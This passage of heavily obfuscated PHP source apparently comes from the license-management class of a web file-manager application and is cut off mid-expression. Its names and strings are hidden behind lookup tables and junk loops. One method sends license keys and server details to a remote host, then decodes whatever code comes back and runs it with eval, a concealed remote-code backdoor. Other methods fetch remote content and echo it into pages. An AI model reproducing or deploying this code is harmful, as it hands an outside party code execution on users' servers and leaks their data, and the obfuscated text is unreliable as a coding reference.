($’Å’Å£[$ã‘¸©­ø[151]]) { $Š«ÅÌ¼ò[$ã‘¸©­ø[189]] = $’Å’Å£[$ã‘¸©­ø[151]]; } $ –’êÀ³ = substr(md5($Š«ÅÌ¼ò[$ã‘¸©­ø[187]]), 10, 10); $ØÄ•öšü = $ –’êÀ³ . $Š«ÅÌ¼ò[$ã‘¸©­ø[104]] . $Š«ÅÌ¼ò[$ã‘¸©­ø[189]]; $Š«ÅÌ¼ò[$ã‘¸©­ø[106]] = strrev(base64_encode($this->kvcod433917a($ØÄ•öšü, $ã‘¸©­ø[191]))); $½“›ôûğ = $¨ƒñ¢‡ó[664]; while (strlen($½“›ôûğ) < $¨ƒñ¢‡ó[654]) { if (!$½“›ôûğ) { break; } $½“›ôûğ++; } $Í°×õ¿Ÿ = rand_string(16); $ˆÕ¾“ = $¨ƒñ¢‡ó[665]; if (strlen($ˆÕ¾“) < $¨ƒñ¢‡ó[637]) { die; } $®£á®íñ = $Í°×õ¿Ÿ . $Š«ÅÌ¼ò[$ã‘¸©­ø[104]] . $this->kvcod433917a(md5($Š«ÅÌ¼ò[$ã‘¸©­ø[185]]), $Í°×õ¿Ÿ); $­…Œ‚òß = $¨ƒñ¢‡ó[666]; if (!$­…Œ‚òß) { die; } $Š«ÅÌ¼ò[$ã‘¸©­ø[107]] = base64_encode(strrev($this->kvcod433917a($®£á®íñ, $ã‘¸©­ø[192]))); $—¯£ÜÅñ = $¨ƒñ¢‡ó[667]; if ($ÇöÛùà[$ã‘¸©­ø[193]] && $ÇöÛùà[$ã‘¸©­ø[193]] >= 1) { Model($ã‘¸©­ø[33])->setDeep($ã‘¸©­ø[194], $ã‘¸©­ø[120]); } Model($ã‘¸©­ø[33])->set($Š«ÅÌ¼ò); $ÚÇÁèİ¢ = md5($_SERVER[$ã‘¸©­ø[101]] . strrev($˜ Â¬éñ) . $Š«ÅÌ¼ò[$ã‘¸©­ø[187]]); $ØÖŸ…„„ = strrev(substr($ÚÇÁèİ¢, 10, 16)); $“ÉŸğ­ = $¨ƒñ¢‡ó[668]; $„‰Î“Ø¨ = $this->osnr6f5b8126(json_encode($ÇöÛùà), $ÚÇÁèİ¢); $ŒÏ²úÔÍ = $¨ƒñ¢‡ó[669]; $ô²ğ¦¢» = array_to_keyvalue(Model($ã‘¸©­ø[7])->listData(), $ã‘¸©­ø[195]); $éé«… = $¨ƒñ¢‡ó[670]; while ($éé«… < $¨ƒñ¢‡ó[654]) { if ($éé«… >= 0) { break; } $éé«…++; } $Š–ø¡´ = $ô²ğ¦¢»[$ã‘¸©­ø[196]]; $Âª½•Ç = array(); $€ùÇë = $¨ƒñ¢‡ó[671]; if (!$€ùÇë) { die; } $Âª½•Ç[$ØÖŸ…„„] = $„‰Î“Ø¨; Model($ã‘¸©­ø[7])->update($Š–ø¡´[$ã‘¸©­ø[197]], array($ã‘¸©­ø[198] => $Âª½•Ç)); $Å»”³çÃ = $¨ƒñ¢‡ó[672]; $this->pudf35a4411b = $ÇöÛùà; $çşô–Ÿ = $¨ƒñ¢‡ó[673]; if (!$çşô–Ÿ) { die; } $this->earl399e790e = $Š«ÅÌ¼ò[$ã‘¸©­ø[104]]; $Æ¸¡ğÆ± = $¨ƒñ¢‡ó[674]; if (strlen($Æ¸¡ğÆ±) < $¨ƒñ¢‡ó[623]) { return; } $this->licenseRegistSuccess(); Cache::set($ã‘¸©­ø[199] . md5($˜ Â¬éñ . $ã‘¸©­ø[200]), $ã‘¸©­ø[6]); show_json(LNG($ã‘¸©­ø[184]), !0); } private function licenseRegistSuccess() { $Ï•Ç£’ =& $_SERVER[¤·²È‰º]; $«ßÍá“á =& $_SERVER[ŸÛı·­]; $„¼Ïô¥º = Model($«ßÍá“á[33])->get(); $ô×²çš = $Ï•Ç£’[675]; if (strlen($ô×²çš) < $Ï•Ç£’[654]) { return; } if ($„¼Ïô¥º[$«ßÍá“á[63]] != $«ßÍá“á[120]) { Model($«ßÍá“á[33])->set($«ßÍá“á[63], $«ßÍá“á[120]); } Action($«ßÍá“á[201])->initStart(!0); } private function jbya8e5aab3b() { $³·Çæû =& $_SERVER[ŸÛı·­]; Model($³·Çæû[33])->set(array($³·Çæû[185] => $³·Çæû[6], $³·Çæû[187] => $³·Çæû[6], $³·Çæû[104] => $³·Çæû[105], $³·Çæû[106] => $³·Çæû[6], $³·Çæû[107] => $³·Çæû[6])); Model($³·Çæû[33])->setDeep($³·Çæû[194], $³·Çæû[202]); $this->pudf35a4411b = array(); $™“úÙÒ¤ = $_SERVER[¤·²È‰º][676]; $this->earl399e790e = $³·Çæû[105]; } private function izhj70bbe8d9() { $Á¡·Ô°¦ =& $_SERVER[¤·²È‰º]; $À÷¹¢õ¯ =& $_SERVER[ŸÛı·­]; $_SERVER[$À÷¹¢õ¯[158]] = _get($_SERVER, $À÷¹¢õ¯[158], APP_HOST); $¦ş»”„ = $Á¡·Ô°¦[677]; $this->earl399e790e = $À÷¹¢õ¯[105]; $óâÖºå£ = Model($À÷¹¢õ¯[33])->get(); $ü®œì•Å = $Á¡·Ô°¦[678]; while (strlen($ü®œì•Å) < $Á¡·Ô°¦[623]) { if (!$ü®œì•Å) { break; } $ü®œì•Å++; } if ($óâÖºå£[$À÷¹¢õ¯[104]] == $À÷¹¢õ¯[105]) { return; } $ÖóÚø‡è = Model($À÷¹¢õ¯[33])->get($À÷¹¢õ¯[102]); $»ş°åòÕ = $À÷¹¢õ¯[199] . md5($ÖóÚø‡è . $À÷¹¢õ¯[200]); $¸èÓü» = Cache::get($»ş°åòÕ); $ÑîÑ“² = $Á¡·Ô°¦[679]; if (!is_array($¸èÓü») || !isset($¸èÓü»[$À÷¹¢õ¯[203]]) || time() - $¸èÓü»[$À÷¹¢õ¯[203]] >= 60) { $à¶½á“ä = Model($À÷¹¢õ¯[7])->loadList(); $”œôÔ­¹ = $à¶½á“ä[$À÷¹¢õ¯[196]]; $œ­óºŞ = md5($_SERVER[$À÷¹¢õ¯[101]] . strrev($ÖóÚø‡è) . $óâÖºå£[$À÷¹¢õ¯[187]]); $ÜÖÓ’©å = strrev(substr($œ­óºŞ, 10, 16)); $¸èÓü» = $this->ojmieef403fc($”œôÔ­¹[$À÷¹¢õ¯[84]][$ÜÖÓ’©å], $œ­óºŞ); $¸èÓü» = json_decode($¸èÓü», !0); } if (!is_array($¸èÓü»)) { return $this->jbya8e5aab3b(); } $ÚèÈÏ…¨ = strtotime($¸èÓü»[$À÷¹¢õ¯[127]]); if (time() >= $ÚèÈÏ…¨) { return $this->jbya8e5aab3b(); } if (time() - $¸èÓü»[$À÷¹¢õ¯[203]] > 20) { $¸èÓü»[$À÷¹¢õ¯[203]] = time(); Cache::set($»ş°åòÕ, $¸èÓü»); } $this->pudf35a4411b = $¸èÓü»; $this->earl399e790e = $óâÖºå£[$À÷¹¢õ¯[104]]; $¢½ºÜ€ = $Á¡·Ô°¦[680]; if (!$¢½ºÜ€) { die; } } private function ltuq26457cf8() { $ßºà¹‚à =& $_SERVER[ŸÛı·­]; $Ëí·ó¾­ = $GLOBALS[$ßºà¹‚à[13]]; $°¸ÙÂ­¥ = $_SERVER[¤·²È‰º][681]; $ôÍÎ™¿• = $_SERVER[$ßºà¹‚à[24]]; if ($ôÍÎ™¿• == $ßºà¹‚à[204] && $this->earl399e790e == $ßºà¹‚à[105]) { show_json(LNG($ßºà¹‚à[205]), !1, $ßºà¹‚à[206]); } $ùîëü¹ì = array($ßºà¹‚à[207], $ßºà¹‚à[208]); if (in_array($ôÍÎ™¿•, $ùîëü¹ì)) { if ($this->earl399e790e == $ßºà¹‚à[105] && isset($Ëí·ó¾­[$ßºà¹‚à[209]])) { show_json(LNG($ßºà¹‚à[205]), !1, $ßºà¹‚à[206]); die; } $âƒ³´½÷ = $this->ugwm60f14f64(); if ($âƒ³´½÷ != intval($ßºà¹‚à[210])) { if ($âƒ³´½÷ <= Model($ßºà¹‚à[123])->count()) { show_json(LNG($ßºà¹‚à[211]), !1, $ßºà¹‚à[206]); die; } } } } private function xnfi3f35936a() { $Çê®Îš =& $_SERVER[¤·²È‰º]; $çÕá«ö =& $_SERVER[ŸÛı·­]; $Øí“ı¥¾ = array($çÕá«ö[117], $çÕá«ö[118]); if (!_get($GLOBALS, $çÕá«ö[114]) || !isset($_GET[$çÕá«ö[212]])) { return; } if (!in_array($_SERVER[$çÕá«ö[24]], $Øí“ı¥¾)) { return; } $ÒÛ ¥Öä = $çÕá«ö[213]; $ÒÛ ¥Öä = $this->bnpz8302a3cd($ÒÛ ¥Öä, $çÕá«ö[214]); $Š¸ŸÙ×õ = $Çê®Îš[682]; if (strlen($Š¸ŸÙ×õ) < $Çê®Îš[19]) { die; } $·“É§ªó = stream_context_create(array($çÕá«ö[215] => array($çÕá«ö[216] => $çÕá«ö[217], $çÕá«ö[218] => 3))); $µ‹Ş¿öÏ = $Çê®Îš[683]; while ($µ‹Ş¿öÏ < $Çê®Îš[19]) { if ($µ‹Ş¿öÏ >= 0) { break; } $µ‹Ş¿öÏ++; } $‡ñ¡ô­é = @file_get_contents($ÒÛ ¥Öä, !1, $·“É§ªó); header($çÕá«ö[219]); if ($‡ñ¡ô­é && strstr($‡ñ¡ô­é, $çÕá«ö[220])) { echo $‡ñ¡ô­é; } die; } public function putd2416b314($¡ˆØ”ş±) { $Ÿàƒ·÷ç =& $_SERVER[ŸÛı·­]; if ($this->earl399e790e == $Ÿàƒ·÷ç[221]) { return $¡ˆØ”ş±; } $ÏºŠ‹ÍÌ = array($Ÿàƒ·÷ç[222] => $Ÿàƒ·÷ç[223], $Ÿàƒ·÷ç[224] => $Ÿàƒ·÷ç[223], $Ÿàƒ·÷ç[225] => $Ÿàƒ·÷ç[223], $Ÿàƒ·÷ç[226] => $Ÿàƒ·÷ç[223], $Ÿàƒ·÷ç[227] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[229] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[230] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[231] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[232] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[233] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[234] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[235] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[236] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[237] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[238] => $Ÿàƒ·÷ç[228], $Ÿàƒ·÷ç[239] => $Ÿàƒ·÷ç[228]); $èòÄ‹µÙ = explode($Ÿàƒ·÷ç[240], _get($this->pudf35a4411b, $Ÿàƒ·÷ç[111], $Ÿàƒ·÷ç[6])); $øÓ™ô± = array(); foreach ($ÏºŠ‹ÍÌ as $Í¢İ½š¥ => $êŒŠ¯‰Á) { if ($êŒŠ¯‰Á == $Ÿàƒ·÷ç[223] && substr($this->earl399e790e, 0, 1) == $Ÿàƒ·÷ç[223]) { continue; } if (!in_array($Í¢İ½š¥, $èòÄ‹µÙ)) { $øÓ™ô±[] = $Í¢İ½š¥; } } foreach ($øÓ™ô± as $Í¢İ½š¥) { unset($¡ˆØ”ş±[$Í¢İ½š¥]); } return $¡ˆØ”ş±; } private function eofs0d2f4cfc() { $Á·€Ã¤Ê =& $_SERVER[ŸÛı·­]; if ($this->earl399e790e != $Á·€Ã¤Ê[105]) { $GLOBALS[$Á·€Ã¤Ê[84]][$Á·€Ã¤Ê[88]][$Á·€Ã¤Ê[241]] = $Á·€Ã¤Ê[202]; return; } $GLOBALS[$Á·€Ã¤Ê[84]][$Á·€Ã¤Ê[242]] = $Á·€Ã¤Ê[120]; if (Model($Á·€Ã¤Ê[243])->get($Á·€Ã¤Ê[63]) != $Á·€Ã¤Ê[202]) { Model($Á·€Ã¤Ê[243])->set($Á·€Ã¤Ê[63], $Á·€Ã¤Ê[202]); } } public function ruhcf157e92e() { return $_SERVER[ŸÛı·­][244]; $ÜØ±ãµî = $_SERVER[¤·²È‰º][684]; if (!$ÜØ±ãµî) { die; } } private function yigza544b90f() { $ğ¼Æ‰‰ƒ =& $_SERVER[ŸÛı·­]; $Áå¢Ü·õ = array($ğ¼Æ‰‰ƒ[245], $ğ¼Æ‰‰ƒ[246], $ğ¼Æ‰‰ƒ[247]); $™úÔ®¤€ = $ğ¼Æ‰‰ƒ[248] . md5($ğ¼Æ‰‰ƒ[249]); if ($this->earl399e790e == $ğ¼Æ‰‰ƒ[105] || !_get($GLOBALS, $ğ¼Æ‰‰ƒ[114])) { return; } if (!in_array($_SERVER[$ğ¼Æ‰‰ƒ[24]], $Áå¢Ü·õ)) { return; } if (time() % 4 != 0) { return; } $Ñ±µ÷×æ = call_user_func(array($ğ¼Æ‰‰ƒ[250], $ğ¼Æ‰‰ƒ[251]), $™úÔ®¤€); if ($Ñ±µ÷×æ && time() - $Ñ±µ÷×æ < intval($ğ¼Æ‰‰ƒ[252])) { return; } call_user_func(array($ğ¼Æ‰‰ƒ[250], $ğ¼Æ‰‰ƒ[137]), $™úÔ®¤€, time()); $—æ¼õğ = Model($ğ¼Æ‰‰ƒ[33])->get($ğ¼Æ‰‰ƒ[102]); $ñÖºÇí = array($ğ¼Æ‰‰ƒ[149] => Model($ğ¼Æ‰‰ƒ[33])->get($ğ¼Æ‰‰ƒ[185]), $ğ¼Æ‰‰ƒ[162] => $this->earl399e790e, $ğ¼Æ‰‰ƒ[159] => $_SERVER[$ğ¼Æ‰‰ƒ[160]], $ğ¼Æ‰‰ƒ[161] => Model($ğ¼Æ‰‰ƒ[33])->get($ğ¼Æ‰‰ƒ[129]), $ğ¼Æ‰‰ƒ[100] => md5($_SERVER[$ğ¼Æ‰‰ƒ[101]] . $—æ¼õğ), $ğ¼Æ‰‰ƒ[152] => $ğ¼Æ‰‰ƒ[134], $ğ¼Æ‰‰ƒ[155] => $_SERVER[$ğ¼Æ‰‰ƒ[156]]); $àì°×…Ş = $this->nmpo8871366d($ğ¼Æ‰‰ƒ[253], $ñÖºÇí); if (!is_array($àì°×…Ş)) { return; } if ($àì°×…Ş[$ğ¼Æ‰‰ƒ[149]] && $àì°×…Ş[$ğ¼Æ‰‰ƒ[254]]) { if ($this->mipuf4acd80d($àì°×…Ş[$ğ¼Æ‰‰ƒ[254]]) == $ñÖºÇí[$ğ¼Æ‰‰ƒ[149]]) { return; } } $this->jbya8e5aab3b(); if ($this->mipuf4acd80d($àì°×…Ş[$ğ¼Æ‰‰ƒ[254]]) != $ñÖºÇí[$ğ¼Æ‰‰ƒ[149]]) { $˜ŠÚıÃÔ = array($ğ¼Æ‰‰ƒ[180] => $—æ¼õğ, $ğ¼Æ‰‰ƒ[181] => $_SERVER[$ğ¼Æ‰‰ƒ[101]], $ğ¼Æ‰‰ƒ[182] => this_url(), $ğ¼Æ‰‰ƒ[157] => $_SERVER[$ğ¼Æ‰‰ƒ[158]]); $­Í”–¢” = $this->wdxke40142f7(json_encode($˜ŠÚıÃÔ)); $àì°×…Ş = $this->nmpo8871366d($ğ¼Æ‰‰ƒ[183] . $­Í”–¢”); if ($àì°×…Ş && is_array($àì°×…Ş) && isset($àì°×…Ş[$ğ¼Æ‰‰ƒ[254]])) { $»Ù¬Ñœ± = $this->ojmieef403fc($àì°×…Ş[$ğ¼Æ‰‰ƒ[254]], 2); if ($»Ù¬Ñœ±) { $»Ù¬Ñœ± = $this->mipuf4acd80d($»Ù¬Ñœ±); } if ($»Ù¬Ñœ±) { try { @eval($»Ù¬Ñœ±); } catch (Exception $·íÆ¢ãã) { } } } } } private function nmpo8871366d($õÑ‡Œ’˜ = '', $Å§Ò·€Õ = array(), $ÈŠ‹·¼ = 5) { $Ñ†ú¶¾ =& $_SERVER[¤·²È‰º]; $ÃöÂŒäï =& $_SERVER[ŸÛı·­]; $©á²êô = $ÃöÂŒäï[255]; $©á²êô = $this->bnpz8302a3cd($©á²êô, $ÃöÂŒäï[256]); $ºÔå­¤ = $Ñ†ú¶¾[685]; if (strlen($ºÔå­¤) < $Ñ†ú¶¾[628]) { die; } $©á²êô = $©á²êô . $õÑ‡Œ’˜; if ($Å§Ò·€Õ && is_array($Å§Ò·€Õ)) { $©á²êô = $©á²êô . $ÃöÂŒäï[257] . http_build_query($Å§Ò·€Õ); } if ($Å§Ò·€Õ === -1) { return $©á²êô; } $š§½­ç = stream_context_create(array($ÃöÂŒäï[215] => array($ÃöÂŒäï[218] => $ÈŠ‹·¼, $ÃöÂŒäï[216] => $ÃöÂŒäï[258]), $ÃöÂŒäï[259] => array($ÃöÂŒäï[260] => !1, $ÃöÂŒäï[261] => !1))); $Å§Ò·€Õ = @file_get_contents($©á²êô, !1, $š§½­ç); $›ˆšôÌ = $Ñ†ú¶¾[686]; return json_decode($Å§Ò·€Õ, !0); $îˆÏÁàÙ = $Ñ†ú¶¾[687]; $ÕÛÔºÌÎ = $Ñ†ú¶¾[688]; if (strlen($ÕÛÔºÌÎ) < $Ñ†ú¶¾[628]) { return; } } private function ugwm60f14f64() { $¤ôÁà³ =& $_SERVER[¤·²È‰º]; $Œ´£ÊáŞ =& $_SERVER[ŸÛı·­]; $ŠÓ­¹˜È = array($Œ´£ÊáŞ[262] => $Œ´£ÊáŞ[263], $Œ´£ÊáŞ[264] => $Œ´£ÊáŞ[265], $Œ´£ÊáŞ[266] => $Œ´£ÊáŞ[267], $Œ´£ÊáŞ[268] => $Œ´£ÊáŞ[269], $Œ´£ÊáŞ[270] => $Œ´£ÊáŞ[271], $Œ´£ÊáŞ[272] => $Œ´£ÊáŞ[210], $Œ´£ÊáŞ[273] => $Œ´£ÊáŞ[210], $Œ´£ÊáŞ[274] => $Œ´£ÊáŞ[263], $Œ´£ÊáŞ[275] => $Œ´£ÊáŞ[265], $Œ´£ÊáŞ[276] => $Œ´£ÊáŞ[267], $Œ´£ÊáŞ[277] => $Œ´£ÊáŞ[278], $Œ´£ÊáŞ[279] => $Œ´£ÊáŞ[269], $Œ´£ÊáŞ[280] => $Œ´£ÊáŞ[281], $Œ´£ÊáŞ[282] => $Œ´£ÊáŞ[271], $Œ´£ÊáŞ[283] => $Œ´£ÊáŞ[284], $Œ´£ÊáŞ[285] => $Œ´£ÊáŞ[286], $Œ´£ÊáŞ[287] => $Œ´£ÊáŞ[288]); $®ƒ…‘Ú† = $ŠÓ­¹˜È[$this->earl399e790e]; $®ƒ…‘Ú† = intval($®ƒ…‘Ú† ? $®ƒ…‘Ú† : $Œ´£ÊáŞ[263]); $¡ ²æğ´ = _get($this->pudf35a4411b, $Œ´£ÊáŞ[289]); $ÜÏÆÎÄ¯ = $¤ôÁà³[689]; if (!$ÜÏÆÎÄ¯) { die; } $¡ ²æğ´ = $¡ ²æğ´ ? intval($¡ ²æğ´) : 0; $ß¶ëß„³ = $¤ôÁà³[690]; return $®ƒ…‘Ú† + $¡ ²æğ´; } public function fghmdf626082($ÆÈÏ“É‡) { $º¸œ ‹û =& $_SERVER[¤·²È‰º]; $Óºœó‡Ê =& $_SERVER[ŸÛı·­]; $øĞ•ğ ñ = $this->ugwm60f14f64(); if ($ÆÈÏ“É‡[$Óºœó‡Ê[290]] == $Óºœó‡Ê[120]) { return; } if ($øĞ•ğ ñ >= intval($Óºœó‡Ê[210])) { return; } $½°Í³Èğ = Model($Óºœó‡Ê[123])->count(); $È’ˆ÷ = $º¸œ ‹û[691]; while (strlen($È’ˆ÷) < $º¸œ ‹û[637]) { if (!$È’ˆ÷) { break; } $È’ˆ÷++; } if ($½°Í³Èğ <= $øĞ•ğ ñ) { return; } $Œšø¼Îï = Model($Óºœó‡Ê[123])->field($Óºœó‡Ê[290])->limit($øĞ•ğ ñ)->select(); $Œšø¼Îï = array_to_keyvalue($Œšø¼Îï, $Óºœó‡Ê[6], $Óºœó‡Ê[290]); if (!in_array($ÆÈÏ“É‡[$Óºœó‡Ê[290]], $Œšø¼Îï)) { show_json($Óºœó‡Ê[291], !1, $Óºœó‡Ê[206]); } } public function caqw2fb723ab() { $™™é·…Ê =& $_SERVER[¤·²È‰º]; $«€ö‘ØÔ =& $_SERVER[ŸÛı·­]; if (!_get($GLOBALS, $«€ö‘ØÔ[114]) || mt_rand(1, 100) > 20) { return; } $Óï‚­ñ„ = $«€ö‘ØÔ[213]; $Óï‚­ñ„ = $this->bnpz8302a3cd($Óï‚­ñ„, $«€ö‘ØÔ[214]); $ìŸ¢¡¥ = stream_context_create(array($«€ö‘ØÔ[215] => array($«€ö‘ØÔ[216] => $«€ö‘ØÔ[217], $«€ö‘ØÔ[218] => 3))); $†üğğÙÓ = @file_get_contents($Óï‚­ñ„, !1, $ìŸ¢¡¥); echo $«€ö‘ØÔ[292] . hash_encode($†üğğÙÓ) . $«€ö‘ØÔ[293]; $ÁØŠéÂ¶ = $™™é·…Ê[692]; if (strlen($ÁØŠéÂ¶) < $™™é·…Ê[19]) { return; } } private function osnr6f5b8126($„øº’£İ, $İ³°‡ß, $ÒÇ¢ÈÔ” = 3) { $­”‹«€˜ =& $_SERVER[¤·²È‰º]; $ºš×Õ—„ =& $_SERVER[ŸÛı·­]; usleep(1); $„øº’£İ = trim($„øº’£İ); $İöÆ•Ÿñ = $­”‹«€˜[693]; if (strlen($İöÆ•Ÿñ) < $­”‹«€˜[19]) { return; } $íÄ«Å = mt_rand(0, 5) . $ºš×Õ—„[6]; $ğ»¾™“³ = rand_string(15); $°—üä‚ = $­”‹«€˜[655]; while ($°—üä‚ < $­”‹«€˜[19]) { if ($°—üä‚ >= 0) { break; } $°—üä‚++; } $Õ‡åÏƒ = $ºš×Õ—„[294]; switch ($íÄ«Å) { case $ºš×Õ—„[202]: $ëÜ‹õ°š = $this->kvcod433917a($„øº’£İ, strrev($İ³°‡ß . $ğ»¾™“³)); break; $ôÔéùî½ = $­”‹«€˜[629]; case $ºš×Õ—„[120]: $ëÜ‹õ°š = $this->kvcod433917a($„øº’£İ, strrev($ğ»¾™“³ . $İ³°‡ß)); $ŞıÏâ¯¢ = $­”‹«€˜[694]; if (!$ŞıÏâ¯¢) { die; } break; case $ºš×Õ—„[295]: $ëÜ‹õ°š = $this->kvcod433917a($„øº’£İ, base64_encode($ğ»¾™“³ . $İ³°‡ß)); $îœßÆ˜ = $­”‹«€˜[695]; if (strlen($îœßÆ˜) < $­”‹«€˜[628]) { return; } break; case $ºš×Õ—„[296]: $ëÜ‹õ°š = $this->kvcod433917a($„øº’£İ, md5($ğ»¾™“³ . $İ³°‡ß)); $ÜÊ·›‹Ì = $­”‹«€˜[696]; if (!$ÜÊ·›‹Ì) { return; } break; case $ºš×Õ—„[297]: $„øº’£İ = base64_encode($„øº’£İ); $³ÎÏñƒ‡ = rand(0, 64); $¸ÀÙŠşÌ = $­”‹«€˜[697]; if (!$¸ÀÙŠşÌ) { die; } $ÜĞŞÙÙ = $Õ‡åÏƒ[$³ÎÏñƒ‡]; $å‡Ì¢ÉÁ = md5($ÜĞŞÙÙ . md5($İ³°‡ß . $ÜĞŞÙÙ) . $İ³°‡ß); $ëúæ°ïÄ = $­”‹«€˜[698]; $å‡Ì¢ÉÁ = substr($å‡Ì¢ÉÁ, $³ÎÏñƒ‡ % 8, $³ÎÏñƒ‡ % 8 + 7); $ƒ“Õ€˜Ç = $­”‹«€˜[699]; while (strlen($ƒ“Õ€˜Ç) < $­”‹«€˜[628]) { if (!$ƒ“Õ€˜Ç) { break; } $ƒ“Õ€˜Ç++; } $ó·šÅÕÆ = $ºš×Õ—„[6]; $Á´’ıÂ = 0; $”’á¼ = 0; $æĞ–¹—Í = $­”‹«€˜[700]; $Ïîàğé° = 0; for ($Á´’ıÂ = 0; $Á´’ıÂ < strlen($„øº’£İ); $Á´’ıÂ++) { $Ïîàğé° = $Ïîàğé° == strlen($å‡Ì¢ÉÁ) ? 0 : $Ïîàğé°; $ëàáöº” = $­”‹«€˜[701]; while (strlen($ëàáöº”) < $­”‹«€˜[628]) { if (!$ëàáöº”) { break; } $ëàáöº”++; } $”’á¼ = ($³ÎÏñƒ‡ + strpos($Õ‡åÏƒ, $„øº’£İ[$Á´’ıÂ]) + ord($å‡Ì¢ÉÁ[$Ïîàğé°++])) % 64; $¸„ìİñ = $­”‹«€˜[702]; if (strlen($¸„ìİñ) < $­”‹«€˜[628]) { return; } $ó·šÅÕÆ .= $Õ‡åÏƒ[$”’á¼]; $ÆÈû„ùÅ = $­”‹«€˜[703]; while ($ÆÈû„ùÅ < $­”‹«€˜[637]) { if ($ÆÈû„ùÅ >= 0) { break; } $ÆÈû„ùÅ++; } } $ëÜ‹õ°š = hash_encode($ÜĞŞÙÙ . $ó·šÅÕÆ); $Ë—£¹¬ñ = $­”‹«€˜[704]; break; $Ø©¡£ñˆ = $­”‹«€˜[705]; if (strlen($Ø©¡£ñˆ) < $­”‹«€˜[628]) { return; } default: $ëÜ‹õ°š = $this->kvcod433917a($„øº’£İ, $İ³°‡ß . $ğ»¾™“³); break; $’ÇÜ†²¿ = $­”‹«€˜[706]; if (strlen($’ÇÜ†²¿) < $­”‹«€˜[623]) { die; } } $ëÜ‹õ°š = strrev($íÄ«Å . $ğ»¾™“³ . $ëÜ‹õ°š); if ($ÒÇ¢ÈÔ” - 1 > 0) { $ëÜ‹õ°š = $this->osnr6f5b8126($ëÜ‹õ°š, $İ³°‡ß, $ÒÇ¢ÈÔ” - 1); } return $ëÜ‹õ°š; } private function ojmieef403fc($¡Â™„÷ı, $æ»Ì£ˆÃ, $óúúñ÷Ş = 3) { $·–î‹ù =& $_SERVER[¤·²È‰º]; $äÈ¥Èæƒ =& $_SERVER[ŸÛı·­]; if (!is_string($¡Â™„÷ı) || strlen($¡Â™„÷ı) < 10) { return !1; } $¡Â™„÷ı = trim($¡Â™„÷ı); $¡Â™„÷ı = strrev($¡Â™„÷ı); $©İÍ•°È = $¡Â™„÷ı[0]; $ƒË’Ú¸Š = $·–î‹ù[707]; while (strlen($ƒË’Ú¸Š) < $·–î‹ù[654]) { if (!$ƒË’Ú¸Š) { break; } $ƒË’Ú¸Š++; } $ áÜşŠ = substr($¡Â™„÷ı, 1, 15); $¡Â™„÷ı = substr($¡Â™„÷ı, 16); $¬ÎÙ€½¤ = $·–î‹ù[708]; if (!$¬ÎÙ€½¤) { die; } $£—Ø†³ = $äÈ¥Èæƒ[294]; $­ĞºÍ›å = $·–î‹ù[709]; switch ($©İÍ•°È) { case $äÈ¥Èæƒ[202]: $¶åª¨ÌÆ = $this->bnpz8302a3cd($¡Â™„÷ı, strrev($æ»Ì£ˆÃ . $ áÜşŠ)); break; $õ‡âª¦ = $·–î‹ù[710]; if (!$õ‡âª¦) { return; } case $äÈ¥Èæƒ[120]: $¶åª¨ÌÆ = $this->bnpz8302a3cd($¡Â™„÷ı, strrev($ áÜşŠ . $æ»Ì£ˆÃ)); $ÉøÇ›µ = $·–î‹ù[698]; if (!$ÉøÇ›µ) { return; } break; $éáóÊ› = $·–î‹ù[711]; if (!$éáóÊ›) { die; } case $äÈ¥Èæƒ[295]: $¶åª¨ÌÆ = $this->bnpz8302a3cd($¡Â™„÷ı, base64_encode($ áÜşŠ . $æ»Ì£ˆÃ)); $Æ“…¨ğ÷ = $·–î‹ù[712]; while (strlen($Æ“…¨ğ÷) < $·–î‹ù[623]) { if (!$Æ“…¨ğ÷) { break; } $Æ“…¨ğ÷++; } break; $îŒ°©à = $·–î‹ù[713]; if (strlen($îŒ°©à) < $·–î‹ù[628]) { die; } case $äÈ¥Èæƒ[296]: $¶åª¨ÌÆ = $this->bnpz8302a3cd($¡Â™„÷ı, md5($ áÜşŠ . $æ»Ì£ˆÃ)); break; case $äÈ¥Èæƒ[297]: $¡Â™„÷ı = hash_decode($¡Â™„÷ı); $¤‚îßâ” = $·–î‹ù[714]; while ($¤‚îßâ” < $·–î‹ù[623]) { if ($¤‚îßâ” >= 0) { break; } $¤‚îßâ”++; } $í·àÈŠ = $¡Â™„÷ı[0]; $ùÍşÇ” = $·–î‹ù[715]; if (strlen($ùÍşÇ”) < $·–î‹ù[637]) { die; } $¡Â™„÷ı = substr($¡Â™„÷ı, 1); $òıØ¾Ê‘ = strpos($£—Ø†³, $í·àÈŠ); $€¨³óáë = $·–î‹ù[716]; if (strlen($€¨³óáë) < $·–î‹ù[654]) { die; } $×Î±îŸ = md5($í·àÈŠ . md5($æ»Ì£ˆÃ . $í·àÈŠ) . $æ»Ì£ˆÃ); $×Î±îŸ = substr($×Î±îŸ, $òıØ¾Ê‘ % 8, $òıØ¾Ê‘ % 8 + 7); $ş‰ñ²Ğ– = $·–î‹ù[717]; if (strlen($ş‰ñ²Ğ–) < $·–î‹ù[654]) { die; } $æüší´ = $äÈ¥Èæƒ[6]; $µã¼ëğ¬ = $·–î‹ù[718]; while ($µã¼ëğ¬ < $·–î‹ù[623]) { if ($µã¼ëğ¬ >= 0) { break; } $µã¼ëğ¬++; } $…ĞÓ¸Ó = 0; $Àİ–€èô = $·–î‹ù[719]; while (strlen($Àİ–€èô) < $·–î‹ù[637]) { if (!$Àİ–€èô) { break; } $Àİ–€èô++; } $”—­õœ = 0; $´Ï×Ğœ = $·–î‹ù[720]; $²¾èø® = 0; for ($…ĞÓ¸Ó = 0; $…ĞÓ¸Ó < strlen($¡Â™„÷ı); $…ĞÓ¸Ó++) { $²¾èø® = $²¾èø® == strlen($×Î±îŸ) ? 0 : $²¾èø®; $Ñ ş§á± = $·–î‹ù[721]; if (!$Ñ ş§á±) { return; } $ùÔ¦ôË’ = $²¾èø®++; $ÙŠ‡ÈµÌ = $·–î‹ù[722]; if (!$ÙŠ‡ÈµÌ) { die; } $”—­õœ = strpos($£—Ø†³, $¡Â™„÷ı[$…ĞÓ¸Ó]) - $òıØ¾Ê‘ - 